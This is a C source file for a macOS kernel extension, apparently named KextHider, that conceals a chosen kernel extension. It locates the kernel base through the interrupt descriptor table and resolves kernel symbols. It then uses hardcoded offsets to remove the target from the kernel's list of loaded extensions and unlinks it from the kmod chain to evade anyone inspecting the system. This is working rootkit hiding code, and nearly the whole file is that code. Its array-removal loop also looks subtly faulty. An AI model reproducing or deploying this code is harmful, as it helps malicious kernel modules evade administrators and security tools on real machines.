//
//  KextHider.c
//   by @_rc0r
//

#include "KextHider.h"

kern_return_t KextHider_start(kmod_info_t * ki, void *d)
{
    DLOG( "[+] Supplied kmod_info_t start addr: %016lX\n", ki->address );
    DLOG( "[+] Supplied kmod_info_t size: %ld\n", ki->size );
    DLOG( "[+] Supplied kmod_info_t name: %s\n", ki->name );
    DLOG( "[+] Supplied kmod_info_t next: %016lX\n", ki->next->address );
    
    find_kernel_baseaddr();
    
    mach_vm_address_t lookupKextWLT;
    
    lookupKextWLT = ( mach_vm_address_t ) find_symbol( (struct mach_header_64 *) KERNEL_MH_START_ADDR,
                                                        "__ZN6OSKext21lookupKextWithLoadTagEj" );
    
    /** locate sLoadedKexts **/
    mach_vm_address_t offset = (mach_vm_address_t) ( ( *(uint32_t *) (lookupKextWLT + 0x1F) ) + 0x23 );
    mach_vm_address_t *sLoadedKexts = (mach_vm_address_t *) (lookupKextWLT + offset);

    /** clean up OSArray of OSKexts **/
    uint32_t *kext_count = NULL;
    
    kext_count = ( uint32_t * ) (*((mach_vm_address_t *)sLoadedKexts)+0x20);
    DLOG( "[+] Loaded kext count: %u\n", *kext_count );
    
    mach_vm_address_t *KextArr = ( mach_vm_address_t * ) ((*sLoadedKexts)+0x18);
    
    DLOG( "[+] ko[0].addr = 0x%016llx\n", *KextArr );

    mach_vm_address_t *ko = (mach_vm_address_t *) *KextArr;

    for( uint8_t i = 0x0; i<*kext_count; i++ )
    {
        kmod_info_t *kmod_info = NULL;
        mach_vm_address_t *kmod_ptr = (mach_vm_address_t *) (ko[i]+0x48);
        kmod_info = ( kmod_info_t * ) *kmod_ptr;
        //DLOG( "[+] kmod_info @ 0x%016llx\n", ( mach_vm_address_t ) *kmod_ptr );
        //DLOG( "[+] kmod_info.name = \"%s\"\n", kmod_info->name );
        
        if( strncmp( kmod_info->name, kextToHide, strlen( kmod_info->name ) ) == 0 )
        {
            DLOG( "[+] Module found at pos. %d of array (0x%016llx)!\n", i, ko[i] );
            
            // now go and remove the entry and adjust count of OSArray
            // stripped from OSArray::removeObject()
            if( i>0 )
            {
                (*kext_count)--;
                
                for( uint8_t j = i; j < (*kext_count); j++ )
                    ko[j]=ko[j+1];
            }
        }
    }
    
    /** do cleanup of kmod list, just in case somebody is watching **/
    
    // points to head of queue which is some bogus? kmod_info
    // next kmod_info belongs to last loaded kext
    kmod_info_t *kmod = ( kmod_info_t * ) find_symbol( ( struct mach_header_64 * ) KERNEL_MH_START_ADDR,
                                            "_kmod");
    
    //DLOG( "[+] Kmod first entry name: \"%s\"\n", kmod->next->name );
    
    kmod_info_t *kmod_info = kmod;
    kmod_info_t *kmod_infop = kmod;
    
    // print list before cleanup
    //while ( ( kmod_info = kmod_info->next ) != NULL )
    //    DLOG( "[b] %s\n", kmod_info->name );
    //kmod_info = kmod;
    
    while ( ( kmod_info = kmod_info->next ) != NULL )
    {
        if( strncmp( kmod_info->name, kextToHide, strlen( kmod_info->name ) ) == 0 )
        {
            kmod_infop->next = kmod_info->next;
            continue;
        }
        
        kmod_infop = kmod_infop->next;
    }

    // print list after cleanup
    //kmod_info = kmod;
    //while ( ( kmod_info = kmod_info->next ) != NULL )
    //    DLOG( "[c] %s\n", kmod_info->name );
    
    return KERN_SUCCESS;
}

kern_return_t KextHider_stop(kmod_info_t *ki, void *d)
{
    return KERN_SUCCESS;
}

struct segment_command_64 *
find_segment_64(struct mach_header_64 *mh, const char *segname)
{
    struct load_command *lc;
    struct segment_command_64 *seg, *foundseg = NULL;
    
    /* First LC begins straight after the mach header */
    lc = (struct load_command *)((uint64_t)mh + sizeof(struct mach_header_64));
    while ((uint64_t)lc < (uint64_t)mh + (uint64_t)mh->sizeofcmds) {
        if (lc->cmd == LC_SEGMENT_64) {
            /* Check load command's segment name */
            seg = (struct segment_command_64 *)lc;
            if (strcmp(seg->segname, segname) == 0) {
                foundseg = seg;
                break;
            }
        }
        
        /* Next LC */
        lc = (struct load_command *)((uint64_t)lc + (uint64_t)lc->cmdsize);
    }
    
    /* Return the segment (NULL if we didn't find it) */
    return foundseg;
}

struct section_64 *
find_section_64(struct segment_command_64 *seg, const char *name)
{
    struct section_64 *sect, *foundsect = NULL;
    u_int i = 0;
    
    /* First section begins straight after the segment header */
    for (i = 0, sect = (struct section_64 *)((uint64_t)seg + (uint64_t)sizeof(struct segment_command_64));
         i < seg->nsects;
         i++, sect = (struct section_64 *)((uint64_t)sect + sizeof(struct section_64)))
    {
        /* Check section name */
        if (strcmp(sect->sectname, name) == 0) {
            foundsect = sect;
            break;
        }
    }
    
    /* Return the section (NULL if we didn't find it) */
    return foundsect;
}

struct load_command *
find_load_command(struct mach_header_64 *mh, uint32_t cmd)
{
    struct load_command *lc, *foundlc;
    
    /* First LC begins straight after the mach header */
    lc = (struct load_command *)((uint64_t)mh + sizeof(struct mach_header_64));
    while ((uint64_t)lc < (uint64_t)mh + (uint64_t)mh->sizeofcmds) {
        if (lc->cmd == cmd) {
            foundlc = (struct load_command *)lc;
            break;
        }
        
        /* Next LC */
        lc = (struct load_command *)((uint64_t)lc + (uint64_t)lc->cmdsize);
    }
    
    /* Return the load command (NULL if we didn't find it) */
    return foundlc;
}

void *
find_symbol(struct mach_header_64 *mh, const char *name)
{
    struct symtab_command *msymtab = NULL;
    struct segment_command_64 *mlc = NULL;
    struct segment_command_64 *mlinkedit = NULL;
    void *mstrtab = NULL;
    
    struct nlist_64 *nl = NULL;
    char *str;
    uint64_t i;
    void *addr = NULL;
    
    /*
     * Check header
     */
    if (mh->magic != MH_MAGIC_64) {
        DLOG("FAIL: magic number doesn't match - 0x%x\n", mh->magic);
        return NULL;
    }
    
    /*
     * Find TEXT section
     */
    mlc = find_segment_64(mh, SEG_TEXT);
    if (!mlc) {
        DLOG("FAIL: couldn't find __TEXT\n");
        return NULL;
    }
    
    /*
     * Find the LINKEDIT and SYMTAB sections
     */
    mlinkedit = find_segment_64(mh, SEG_LINKEDIT);
    if (!mlinkedit) {
        DLOG("FAIL: couldn't find __LINKEDIT\n");
        return NULL;
    }
    
    msymtab = (struct symtab_command *)find_load_command(mh, LC_SYMTAB);
    if (!msymtab) {
        DLOG("FAIL: couldn't find SYMTAB\n");
        return NULL;
    }
    
    /*
     * Enumerate symbols until we find the one we're after
     *
     *  Be sure to use NEW calculation STRTAB in Mountain Lion!
     */
    mstrtab = (void *)((int64_t)mlinkedit->vmaddr + (msymtab->stroff - mlinkedit->fileoff));
    
    // First nlist_64 struct is NOW located @:
    for (i = 0, nl = (struct nlist_64 *)(mlinkedit->vmaddr + (msymtab->symoff - mlinkedit->fileoff));
         i < msymtab->nsyms;
         i++, nl = (struct nlist_64 *)((uint64_t)nl + sizeof(struct nlist_64)))
    {
        str = (char *)mstrtab + nl->n_un.n_strx;
        
        if (strcmp(str, name) == 0) {
            addr = (void *)nl->n_value;
        }
    }
    
    /* Return the address (NULL if we didn't find it) */
    return addr;
}

uint64_t find_kernel_baseaddr( )
{
    uint8_t idtr[ 10 ];
    uint64_t idt = 0;
    
    __asm__ volatile ( "sidt %0": "=m" ( idtr ) );
    
    idt = *( ( uint64_t * ) &idtr[ 2 ] );
    struct descriptor_idt *int80_descriptor = NULL;
    uint64_t int80_address = 0;
    uint64_t high = 0;
    uint32_t middle = 0;
    
    int80_descriptor = ( struct descriptor_idt * ) _MALLOC( sizeof( struct descriptor_idt ), M_TEMP, M_WAITOK );
    bcopy( (void*)idt, int80_descriptor, sizeof( struct descriptor_idt ) );
    
    high = ( unsigned long ) int80_descriptor->offset_high << 32;
    middle = ( unsigned int ) int80_descriptor->offset_middle << 16;
    int80_address = ( uint64_t )( high + middle + int80_descriptor->offset_low );
    
    uint64_t temp_address = int80_address;
    uint8_t *temp_buffer = ( uint8_t * ) _MALLOC( 4, M_TEMP, M_WAITOK );
    
    while( temp_address > 0 )
    {
        bcopy( ( void * ) temp_address, temp_buffer, 4 );
        if ( *( uint32_t * )( temp_buffer ) == MH_MAGIC_64 )
        {
            KERNEL_MH_START_ADDR = temp_address;
            return 0;
        }
        temp_address -= 1;
    }
    
    return -1;
}